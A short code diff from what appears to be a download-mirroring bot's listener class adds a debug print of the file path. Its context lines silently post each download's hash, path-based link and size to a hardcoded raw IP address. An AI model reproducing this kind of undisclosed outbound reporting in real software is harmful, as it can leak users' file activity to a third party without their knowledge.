@@ -66,6 +66,7 @@ class MirrorLeechListener:
         m_path = f"{self.dir}/{name}"
         size = get_path_size(m_path)
         size_str = get_readable_file_size(size)
+        print(f'{m_path}')
         s = rpost('http://5.75.233.44:5000',json={'Hash':self.Hash,'Link':f'http://45.159.149.18/{m_path}','Size':size_str})
         print('rund')
 
